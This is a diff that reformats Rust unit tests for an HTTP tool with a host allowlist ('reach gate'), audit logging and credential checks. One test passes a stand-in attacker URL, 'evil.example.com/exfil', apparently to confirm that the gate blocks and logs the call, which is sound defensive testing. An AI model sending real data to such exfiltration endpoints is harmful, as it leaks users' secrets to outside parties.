@@ -345,14 +345,19 @@ mod tests {
                 purpose: "test".into(),
                 credential: None,
             }],
-            vec![ToolReach { tool: "http".into(), scope: ReachScope::Egress }],
+            vec![ToolReach {
+                tool: "http".into(),
+                scope: ReachScope::Egress,
+            }],
         )
     }
 
     #[test]
     fn reach_allows_allowlisted_host() {
         let tool = HttpTool::new().with_reach_gate(gate());
-        assert!(tool.check_reach("https://api.allowed.example/v1/thing").is_ok());
+        assert!(tool
+            .check_reach("https://api.allowed.example/v1/thing")
+            .is_ok());
     }
 
     #[test]
@@ -393,7 +398,9 @@ mod tests {
         let auditor = Arc::new(Mutex::new(
             ActionAuditor::open(key.clone(), path.clone()).unwrap(),
         ));
-        let tool = HttpTool::new().with_reach_gate(gate()).with_auditor(Arc::clone(&auditor));
+        let tool = HttpTool::new()
+            .with_reach_gate(gate())
+            .with_auditor(Arc::clone(&auditor));
 
         let result = tool
             .execute(json!({"url": "https://evil.example.com/exfil"}))
@@ -417,7 +424,10 @@ mod tests {
                 purpose: "test".into(),
                 credential: Some("api-key".into()),
             }],
-            vec![ToolReach { tool: "http".into(), scope: ReachScope::Egress }],
+            vec![ToolReach {
+                tool: "http".into(),
+                scope: ReachScope::Egress,
+            }],
         )
     }
 
@@ -433,7 +443,9 @@ mod tests {
     fn reach_surfaces_the_named_credential_on_allow() {
         let tool = HttpTool::new().with_reach_gate(gate_with_cred());
         assert_eq!(
-            tool.check_reach("https://api.allowed.example/x").unwrap().as_deref(),
+            tool.check_reach("https://api.allowed.example/x")
+                .unwrap()
+                .as_deref(),
             Some("api-key")
         );
     }
@@ -443,7 +455,9 @@ mod tests {
         assert!(HttpTool::caller_set_authorization(
             &json!({"headers": {"AuThOrIzAtIoN": "Bearer x"}})
         ));
-        assert!(!HttpTool::caller_set_authorization(&json!({"headers": {"X-Other": "y"}})));
+        assert!(!HttpTool::caller_set_authorization(
+            &json!({"headers": {"X-Other": "y"}})
+        ));
         assert!(!HttpTool::caller_set_authorization(&json!({})));
     }
 
